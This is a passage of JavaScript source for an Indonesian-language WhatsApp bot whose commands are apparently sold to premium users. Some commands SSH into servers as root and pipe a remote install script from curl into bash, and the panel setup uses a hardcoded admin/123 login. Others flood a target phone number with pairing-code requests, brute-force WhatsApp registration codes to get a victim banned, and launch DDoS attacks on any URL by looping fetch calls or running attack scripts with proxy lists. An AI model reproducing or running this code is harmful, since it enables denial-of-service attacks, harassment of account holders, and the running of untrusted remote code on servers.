                console.log('Panel installation stream closed with code ' + code + ' and signal ' + signal);
                installWings(conn, domainnode, subdomain, password, ramvps);
            }).on('data', (data) => {
                handlePanelInstallationInput(data, stream, subdomain, password);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).connect(connSettings);

    async function installWings(conn, domainnode, subdomain, password, ramvps) {
        m.reply('𝗣𝗥𝗢𝗦𝗘𝗦 𝗣𝗘𝗡𝗚𝗜𝗡𝗦𝗧𝗔𝗟𝗟𝗔𝗡 𝗪𝗜𝗡𝗚𝗦 𝗦𝗔𝗕𝗔𝗥 𝗬𝗔 𝗠𝗔𝗡𝗜𝗘𝗭');
        conn.exec(commandWings, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Wings installation stream closed with code ' + code + ' and signal ' + signal);
                createNode(conn, domainnode, ramvps, subdomain, password);
            }).on('data', (data) => {
                handleWingsInstallationInput(data, stream, domainnode, subdomain);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    async function createNode(conn, domainnode, ramvps, subdomain, password) {
        const command = 'bash <(curl https://raw.githubusercontent.com/Rizxcode/thema/main/install.sh)';
        m.reply('𝗠𝗘𝗠𝗨𝗟𝗔𝗜 𝗖𝗥𝗘𝗔𝗧𝗘 𝗡𝗢𝗗𝗘 & 𝗟𝗢𝗖𝗔𝗧𝗜𝗢𝗡');

        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Node creation stream closed with code ' + code + ' and signal ' + signal);
                conn.end();
                sendPanelData(subdomain, password);
            }).on('data', (data) => {
                handleNodeCreationInput(data, stream, domainnode, ramvps);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    function sendPanelData(subdomain, password) {
        m.reply(`𝗗𝗔𝗧𝗔 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n\n𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘: admin\n𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗: 123\n𝗟𝗢𝗚𝗜𝗡: ${subdomain}\n\n𝗡𝗼𝘁𝗲: 𝗦𝗲𝗺𝘂𝗮 𝗜𝗻𝘀𝘁𝗮𝗹𝗮𝘀𝗶 𝗧𝗲𝗹𝗮𝗵 𝗦𝗲𝗹𝗲𝘀𝗮𝗶 𝗦𝗶𝗹𝗮𝗵𝗸𝗮𝗻 𝗖𝗿𝗲𝗮𝘁𝗲 𝗔𝗹𝗹𝗼𝗰𝗮𝘁𝗶𝗼𝗻 𝗗𝗶 𝗡𝗼𝗱𝗲 𝗬𝗮𝗻𝗴 𝗗𝗶 𝗯𝘂𝗮𝘁 𝗢𝗹𝗲𝗵 𝗕𝗼𝘁 𝗗𝗮𝗻 𝗔𝗺𝗯𝗶𝗹 𝗧𝗼𝗸𝗲𝗻 𝗖𝗼𝗻𝗳𝗶𝗴𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗱𝗮𝗻 𝗸𝗲𝘁𝗶𝗸 .𝘀𝘁𝗮𝗿𝘁𝘄𝗶𝗻𝗴𝘀 (𝘁𝗼𝗸𝗲𝗻) \n𝗡𝗼𝘁𝗲: 𝗛𝗔𝗥𝗔𝗣 𝗧𝗨𝗡𝗚𝗚𝗨 𝟭-𝟱𝗠𝗘𝗡𝗜𝗧 𝗕𝗜𝗔𝗥 𝗪𝗘𝗕 𝗕𝗜𝗦𝗔 𝗗𝗜 𝗕𝗨𝗞𝗔`);
    }

    function handlePanelInstallationInput(data, stream, subdomain, password) {
        if (data.toString().includes('Input')) {
            stream.write('0\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('123\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('Asia/Jakarta\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`123\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('yes\n');
        }
        if (data.toString().includes('Please read the Terms of Service')) {
            stream.write('Y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleWingsInstallationInput(data, stream, domainnode, subdomain) {
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('123\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${domainnode}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleNodeCreationInput(data, stream, domainnode, ramvps) {
        stream.write('rizaljomok\n');
        stream.write('4\n');
        stream.write('SGP\n');
        stream.write('Bot auto Installer ©𝑹𝑰𝒁𝑿𝑽𝑬𝑳𝒁 V2.0.0🦅🇮🇩\n');
        stream.write(`${domainnode}\n`);
        stream.write('©𝑹𝑰𝒁𝑿𝑽𝑬𝑳𝒁 V2.0.0\n');
        stream.write(`${ramvps}\n`);
        stream.write(`${ramvps}\n`);
        stream.write('1\n');
        console.log('STDOUT: ' + data);
    }
}
break
case "startwings": {
    if (!isPremium && !isOwner) return rzxReply(mess.only.premium)
    
    let t = text.split(',');
    if (t.length < 2) return rzxReply(`*Format salah!*\nPenggunaan: .startwings ipvps,password,token (token configuration)`)
    
    let ipvps = t[0];
    let passwd = t[1];
    let token = t[2];
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    // Gunakan string terenkripsi di kode Anda
    const command = 'bash <(curl https://raw.githubusercontent.com/Rizxcode/thema/main/install.sh)'
    const conn = new Client();
 
    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        rzxReply('𝐏𝐑𝐎𝐒𝐄𝐒 𝐈𝐍𝐒𝐓𝐀𝐋𝐋 𝐖𝐈𝐍𝐆𝐒 𝐁𝐀𝐍𝐆 𝐑𝐈𝐙𝐗𝐕𝐄𝐋𝐙🚀')
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
reply('𝐒𝐔𝐂𝐂𝐄𝐒 𝐈𝐍𝐒𝐓𝐀𝐋𝐋 𝐖𝐈𝐍𝐆𝐒 𝐂𝐄𝐊 𝐏𝐀𝐒𝐓𝐈 𝐇𝐀𝐓𝐈 𝐍𝐘𝐀 𝐔𝐃𝐀𝐇 𝐇𝐈𝐉𝐀𝐔😁');
                conn.end();
            }).on('data', (data) => {
            stream.write('rizaljomok\n');
                stream.write('3\n');
                stream.write(`${token}\n`)
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        rzxReply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
}
break
case "installthema": {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)
let t = text.split(',');
if (t.length < 2) return rzxReply(`*Format salah!*
Penggunaan:
${prefix + command} ipVps,password`)
let ipvps = t[0];
let passwd = t[1];

let sections = [{
title: 'Silahkan Pilih Theme Yang Ingin Di install',
rows: [{
title: 'INSTALL THEME STELLAR',
id: `.th1 ${ipvps},${passwd}`
},
{
title: 'INSTALL THEME BILLING', 
id: `.th2 ${ipvps},${passwd}`
},
{
title: 'INSTALL THEME ENIGMA',
id: `.th3 ${ipvps},${passwd}`
}]
}]

let listMessage = {
    title: 'Klik Disini!', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '1203632@newsletter',
 newsletterName: 'Powered By ©𝑹𝑰𝒁𝑿𝑽𝑬𝑳𝒁 V2.0.0', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: rzx.decodeJid(rzx.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: Styles(`Silahkan Pilih Theme Yang Ingin Anda Install`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${global.footer2}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `*Hi @${pushname} 👋*`,
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/bbd9c5027512cc31f5309.jpg" } }, { upload: rzx.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await rzx.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break  
case "th1": {
    if (!isOwner) return ('Maaf Hanya Untuk ©𝑹𝑰𝒁𝑿𝑽𝑬𝑳𝒁 V2.0.0');
    
    let t = text.split(',');
    if (t.length < 2) return m.reply(`*Format salah!*\nPenggunaan: ${prefix}installtheme ipvps,password`)
    
    let ipvps = t[0];
    let passwd = t[1];
    
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    // Fungsi untuk mendekode representasi byte kembali ke string asli
    function Rizxvelz(opece) {
        return opece.split('\\x').slice(1).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
    }

    // Gunakan string terenkripsi di kode Anda
    const command = 'bash <(curl https://raw.githubusercontent.com/Rizxcode/thema/main/install.sh)'

    const conn = new Client();
    let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi

    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        m.reply('*PROSES INSTALL THEME DIMULAI MOHON TUNGGU 5-10 MENIT KEDEPAN*');
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                m.reply('`SUKSES INSTALL THEME PANEL ANDA, SILAHKAN CEK`')
                conn.end();
            }).on('data', (data) => {
                stream.write('rizaljomok\n');
                stream.write('1\n');
                stream.write('1\n');
                stream.write('y\n');
                stream.write('x\n');
                
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        m.reply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
   
   setTimeout(() => {
        if (isSuccess) {
            m.reply('DONE GA BANG??');
        }
    }, 300000); // 180000 ms = 3 menit
   
}


    break  
    case "th2": {
    if (!isOwner) return ('Maaf Hanya Untuk ©𝑹𝑰𝒁𝑿𝑽𝑬𝑳𝒁 V2.0.0');
    
    let t = text.split(',');
    if (t.length < 2) return m.reply(`*Format salah!*\nPenggunaan: ${prefix}installtheme ipvps,password`)
    
    let ipvps = t[0];
    let passwd = t[1];
    
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    // Fungsi untuk mendekode representasi byte kembali ke string asli
    function Rizxvelz(opece) {
        return opece.split('\\x').slice(1).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
    }

    // Gunakan string terenkripsi di kode Anda
    const command = 'bash <(curl https://raw.githubusercontent.com/Rizxcode/thema/main/install.sh)'

    const conn = new Client();
    let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi

    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        m.reply('*PROSES INSTALL THEME DIMULAI MOHON TUNGGU 5-10 MENIT KEDEPAN*');
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                m.reply('`SUKSES INSTALL THEME PANEL ANDA, SILAHKAN CEK`')
                conn.end();
            }).on('data', (data) => {
                stream.write('rizaljomok\n');
                stream.write('1\n');
                stream.write('2\n');
                stream.write('yes\n');
                stream.write('x\n');
                
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        m.reply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
   
   setTimeout(() => {
        if (isSuccess) {
            m.reply('DONE GA BANG??');
        }
    }, 300000); // 180000 ms = 3 menit
   
}


    break  
    case "th3": {
    if (!isOwner) return ('Maaf Hanya Untuk ©𝑹𝑰𝒁𝑿𝑽𝑬𝑳𝒁 V2.0.0');
    
    let t = text.split(',');
    if (t.length < 2) return m.reply(`*Format salah!*\nPenggunaan: ${prefix}installtheme ipvps,password`)
    
    let ipvps = t[0];
    let passwd = t[1];
    
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    // Fungsi untuk mendekode representasi byte kembali ke string asli
    function Rizxvelz(opece) {
        return opece.split('\\x').slice(1).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
    }

    // Gunakan string terenkripsi di kode Anda
    const command = 'bash <(curl https://raw.githubusercontent.com/Rizxcode/thema/main/install.sh)'

    const conn = new Client();
    let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi

    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        m.reply('*PROSES INSTALL THEME DIMULAI MOHON TUNGGU 5-10 MENIT KEDEPAN*');
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                m.reply('`SUKSES INSTALL THEME PANEL ANDA, SILAHKAN CEK`')
                conn.end();
            }).on('data', (data) => {
                stream.write('rizaljomok\n');
                stream.write('1\n');
                stream.write('3\n');
                stream.write('\n');
                stream.write('\n');
                stream.write('\n');
                stream.write('yes\n');
                stream.write('x\n');
                
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        m.reply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
   
   setTimeout(() => {
        if (isSuccess) {
            m.reply();
        }
    }, 300000); // 180000 ms = 3 menit
    
}
   // TEMP BAND
   break
   case 'spampair': {
			if (!isOwner) return rzxReply(mess.owner)
			if (!q) return rzxReply(`*Syntax Error!*\n\n_Use : Spampair NUMBER|AMOUNT_\n_Example : Spampair 62xx\n\n𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚🎭`)
			let [peenis, pepekk = "200"] = q.split("|")
			await rzxReply(`</> 𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙥𝙖𝙢 𝘾𝙤𝙙𝙚〽️`)
			let target = peenis.replace(/[^0-9]/g, '').trim()
			let {
				default: makeWaSocket,
				useMultiFileAuthState,
				fetchLatestBaileysVersion
			} = require('@whiskeysockets/baileys@^6.4.0')
			let {
				state
			} = await useMultiFileAuthState('TheRzxWangsaff')
			let {
				version
			} = await fetchLatestBaileysVersion()
			let sucked = await makeWaSocket({
				auth: state,
				version,
				logger: pino({
					level: 'fatal'
				})
			})
			for (let i = 0; i < pepekk; i++) {
				await sleep(1500)
				let prc = await sucked.requestPairingCode(target)
				await console.log(`# Succes Spam Pairing Code - Number : ${target} - Code : ${prc}`)
			}
			await sleep(15000)
		}
		break
		case 'tempban': {
	if (!isOwner) return rzxReply(mess.owner)
	if (args.length < 1) return rzxReply(`*Syntax Error!*\n\n_Use : Tempban ID|NO_\n_Example : Tempban 62|819\n\n𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚🎭`);
	const args2 = args[0].split('|');
	if (args2.length !== 2) return rzxReply(`Syntax Error!*\n\n_Use : Tempban ID|NO_\n_Example : Tempban 62|819_\n\n𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚🎭`);
	const rzxCountryCode = args2[0];
	const xtarget = args2[1];
	const rzxNumber = xtarget.replace('@s.whatsapp.net', '');
	const rzxmerge = `${rzxCountryCode}${xtarget}`
	const rzxMention = rzxmerge + '@s.whatsapp.net';
	await rzxReply(`</> 𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙥𝙖𝙢 𝘾𝙤𝙙𝙚〽️`)
	try {
		const {
			staterzx,
			saveCredsrzx
		} = await useMultiFileAuthState('./TheGetsuzoZhiro');
		const rzxRequest = await rzx.requestRegistrationCode({
			phoneNumber: '+' + rzxCountryCode + `${rzxNumber}`,
			phoneNumberCountryCode: rzxCountryCode,
			phoneNumberNationalNumber: `${rzxNumber}`,
			phoneNumberMobileCountryCode: 724,
			method: 'sms'
		});
	} catch (err) {}

	for (let i = 0; i < 10000; i++) {
		try {
			var rzxPrefix = Math.floor(Math.random() * 999);
			var rzxSuffix = Math.floor(Math.random() * 999);
			await rzx.register(`${rzxPrefix}-${rzxSuffix}`);
		} catch (err) {
			console.log(`${rzxPrefix}-${rzxSuffix}`);
		}
	}
}
// MAIN MENU
break 
case 'join':
case 'joingc': {
if (!isOwner) return (mess.only.premium)
if (!text) return rzxReply(`Contoh: ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return rzxReply('Harus berupa link grup WhatsApp!')
rzx.sendMessage(m.chat, {text: 'Sukses join ke grup.'}, {quoted: m})
let result = args[0].split('https://chat.whatsapp.com/')[1]
await rzx.groupAcceptInvite(result)
}
// DDOS
        break
		case 'dos': {
			if (!isPremium && !isOwner) return rzxReply(mess.only.premium)
			let url = q.split(" ")[0]
			let time = q.split(" ")[1] * 1000
			if (args.length === 2 && url && !isNaN(time)) {
				let attack = () => {
					let totalRequests = 0
					let threads = []
					for (let j = 0; j < 6; j++) {
						threads.push(
							new Promise((resolve, reject) => {
								let interval = setInterval(() => {
									for (let j = 0; j < 100; j++) {
										fetch(url)
											.then(() => {
												totalRequests++
												console.log(`Attacking => ${url} Total Requests: ${totalRequests} Duration: ${time}`)
											})
											.catch(err => {})
									}
								}, 750)
								setTimeout(() => {
									clearInterval(interval)
									resolve()
								}, time)
							})
						)
					}

					Promise.all(threads)
						.then(() => console.log("Attack Complete"))
						.catch(err => console.error("Error In Attack:", err))
				}

				attack()
			} else {
				rzxReply(`Format Pesan Tidak Benar. Gunakan Format: Dos [Url] [Time]`)
			}
		}
		break
		case 'ddos': {
			if (!isPremium && !isOwner) return rzxReply(mess.only.premium)
			let url = q.split(" ")[0]
			let time = q.split(" ")[1]
			let thread = q.split(" ")[2]
			let rate = q.split(" ")[3]
			if (args.length === 4 && url && time && thread && rate) {
				rzxReply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
				exec(`node ./ddos/hentai.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
					if (err) return console.log(err.toString())
					if (stdout) return console.log(util.format(stdout))
				})
			} else {
				rzxReply(`Format Pesan Tidak Benar. Gunakan Format : Ddos [Url] [Time] [Thread] [Rate]`)
			}
		}
		break
		case 'xc': {
			if (!isPremium && !isOwner) return rzxReply(mess.only.premium)
			let [url, time, rate, thread, proxyFile] = q.split(" ");
			if (args.length === 5 && url && time && rate && thread && proxyFile) {
				rzxReply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju: ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
				exec(`node ./ddos/LC.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
					if (err) return console.log(err.toString());
					if (stdout) return console.log(util.format(stdout));
				});
			} else {
				rzxReply(`Format Pesan Tidak Benar. Gunakan Format: Xc [Url] [Time] [Rate] [Thread] [ProxyFile]`);
			}
		}
		break
		case 'mix': {
			if (!isPremium && !isOwner) return rzxReply(mess.only.premium)
			let url = q.split(" ")[0]
			let time = q.split(" ")[1]
			let thread = q.split(" ")[2]
			let rate = q.split(" ")[3]
			if (args.length === 4 && url && time && thread && rate) {
				rzxReply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
				exec(`node ./ddos/mix.js ${url} ${time} ${thread} ${rate}`, (err, stdout) => {
					if (err) return console.log(err.toString())
					if (stdout) return console.log(util.format(stdout))
				})
			} else {
				rzxReply(`Format Pesan Tidak Benar. Gunakan Format : Mix [Url] [Time] [Thread] [Rate]`)
			}
		}
		break
		case 'floods': {
			if (!isPremium && !isOwner) return rzxReply(mess.only.premium)
			let url = q.split(" ")[0]
			let time = q.split(" ")[1]
			let thread = q.split(" ")[2]
			let rate = q.split(" ")[3]
			if (args.length === 4 && url && time && thread && rate) {
				rzxReply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
				exec(`node ./ddos/floods.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
					if (err) return console.log(err.toString())
					if (stdout) return console.log(util.format(stdout))
				})
			} else {
				rzxReply(`Format Pesan Tidak Benar. Gunakan Format : Floods [Url] [Time] [Thread] [Rate]`)
			}
		}
		break
		case 'ua': {
			if (!isPremium && !isOwner) return rzxReply(mess.only.premium)
			let url = q.split(" ")[0]
			let time = q.split(" ")[1]
			let thread = q.split(" ")[2]
			let rate = q.split(" ")[3]
			if (args.length === 4 && url && time && thread && rate) {
				rzxReply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
				exec(`node ./ddos/kilua.js ${url} ${time} ${thread} proxy.txt ${rate} ua.txt`, (err, stdout) => {
					if (err) return console.log(err.toString())
					if (stdout) return console.log(util.format(stdout))
				})
			} else {
				rzxReply(`Format Pesan Tidak Benar. Gunakan Format : Ua [Url] [Time] [Thread] [Rate]`)
			}
		}
		break
		case 'xchrome': {
			if (!isPremium && !isOwner) return rzxReply(mess.only.premium)
			let url = q.split(" ")[0]
			let time = q.split(" ")[1]
			let thread = q.split(" ")[2]
			let rate = q.split(" ")[3]
			if (args.length === 4 && url && time && thread && rate) {
				rzxReply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
				exec(`node ./ddos/chromev3.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
					if (err) return console.log(err.toString())
					if (stdout) return console.log(util.format(stdout))
				})
			} else {
				rzxReply(`Format Pesan Tidak Benar. Gunakan Format Xchrome [Url] [Time] [Thread] [Rate]`)
			}
		}
		break
		case 'tls': {
			if (!isPremium && !isOwner) return rzxReply(mess.only.premium)
			let url = q.split(" ")[0]
			let time = q.split(" ")[1]
			let thread = q.split(" ")[2]
			let rate = q.split(" ")[3]
			if (args.length === 4 && url && time && thread && rate) {
				rzxReply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
				exec(`node ./ddos/tls-arz.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
					if (err) return console.log(err.toString())
					if (stdout) return console.log(util.format(stdout))
				})
			} else {
				rzxReply(`Format Pesan Tidak Benar. Gunakan Format Tls [Url] [Time] [Thread] [Rate]`)
			}
		}
		break
		case 'tlsbypass': {
			if (!isPremium && !isOwner) return rzxReply(mess.only.premium)
			let url = q.split(" ")[0]
			let time = q.split(" ")[1]
			let thread = q.split(" ")[2]
			let rate = q.split(" ")[3]
			if (args.length === 4 && url && time && thread && rate) {
				rzxReply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
				exec(`node ./ddos/tls-bypass.js ${url} ${time} ${rate} ${thread}`, (err, stdout) => {
					if (err) return console.log(err.toString())
					if (stdout) return console.log(util.format(stdout))
				})
			} else {
				rzxReply(`Format Pesan Tidak Benar. Gunakan Format Tlsbypass [Url] [Time] [Thread] [Rate]`)
			}
		}
		break
		case 'tlsv2': {
			if (!isPremium && !isOwner) return rzxReply(mess.only.premium)
			let url = q.split(" ")[0]
			let time = q.split(" ")[1]
			let thread = q.split(" ")[2]
			let rate = q.split(" ")[3]
			if (args.length === 4 && url && time && thread && rate) {
				rzxReply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
				exec(`node ./ddos/tls.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
					if (err) return console.log(err.toString())
					if (stdout) return console.log(util.format(stdout))
				})
			} else {
				rzxReply(`Format Pesan Tidak Benar. Gunakan Format Tlsv2 [Url] [Time] [Thread] [Rate]`)
			}
		}
		break
		case 'bypass-cf': {
			if (!isPremium && !isOwner) return rzxReply(mess.only.premium)
			let url = q.split(" ")[0]
			let time = q.split(" ")[1]
			let thread = q.split(" ")[2]
			let rate = q.split(" ")[3]
			if (args.length === 4 && url && time && thread && rate) {
				rzxReply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
				exec(`node ./ddos/bypass.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
					if (err) return console.log(err.toString())
					if (stdout) return console.log(util.format(stdout))
				})
			} else {
				rzxReply(`Format Pesan Tidak Benar. Gunakan Format : Bypass-cf [Url] [Time] [Thread] [Rate]`)
			}
		}
		break
		case 'tls-vip': {
			if (!isPremium && !isOwner) return rzxReply(mess.only.premium)
			let url = q.split(" ")[0]
			let time = q.split(" ")[1]
			let thread = q.split(" ")[2]
			let rate = q.split(" ")[3]
			if (args.length === 4 && url && time && thread && rate) {
				rzxReply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
				exec(`node ./ddos/tlsvip.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
					if (err) return console.log(err.toString())
					if (stdout) return console.log(util.format(stdout))
				})
			} else {
				rzxReply(`Format Pesan Tidak Benar. Gunakan Format Tls-vip [Url] [Time] [Thread] [Rate]`)
			}
		}
		break 
	    case 'ytmp4': {
			if (!args[0]) return rzxReply(`*Example :*\n\n*Ytmp4 Link*`);
			rzxReply(resbug)
			let api = await fetch(`https://api.betabotz.eu.org/api/download/ytmp4?url=${args[0]}&apikey=GetsuzoZhiro`);
			let betaku = await api.json();
			const {
				title,
				thumb, // Menggunakan thumb dari result
				mp4,
				duration,
				source // URL video YouTube
			} = betaku.result;
			await rzx.sendMessage(from, {
				image: {
					url: thumb
				},
				caption: `*› Source :* ${source}`
			}, {
				quoted: Zets
			});
			await rzx.sendMessage(from, {
				video: {
					url: mp4
				},
				caption: `${gris}[ Y O U T U B E ]${gris}\n\n*› Title : ${title}*\n*› Duration : ${duration}*`,
				mimetype: 'video/mp4',
			}, {
				quoted: Zets
			});
			await rzx.sendButtons(from, {
				"body": `\`\`「 ${gris}[ Y O U T U B E ]${gris} 」\`\`\n\n  *›  UNDUH MUSIC*\n${hiasan}*Durations : ${duration}*`,
				"footer": "⿻  ⌜ 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚🐉 ⌟  ⿻",
				"buttons": [{
					"displayText": "𝐒𝐎𝐔𝐍𝐃𝐒",
					"id": `ytmp3 ${q}`
				}]
			}, {
				quoted: Zets
			})
		}
		break
		case 'ythd': {
			if (!text) return rzxReply(`*Example :*\n\n*Ythd Link*`);
			rzx.sendMessage(m.chat, {
				react: {
					text: '✨',
					key: m.key
				}
			})
			let searchResponse = await ytdlnew(text)
			const ytc = `*[ ${gris}YOUTUBE HD QUALITY${gris} ]*\n\n${gris}©${gris}${packname}`;
			await rzx.sendMessage(m.chat, {
				video: {
					url: searchResponse.mp4DownloadLink
				},
				caption: ytc
			}, {
				quoted: Zets
			});
			await rzx.sendButtons(from, {
				"body": `\`\`「 ${gris}[ Y O U T U B E ]${gris} 」\`\`\n\n  *›  UNDUH MUSIC*`,
				"footer": "⿻  ⌜ 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚🐉 ⌟  ⿻",
				"buttons": [{
					"displayText": "𝐒𝐎𝐔𝐍𝐃𝐒",
					"id": `ytmp3 ${q}`
				}]
			}, {
				quoted: Zets
			})
		}
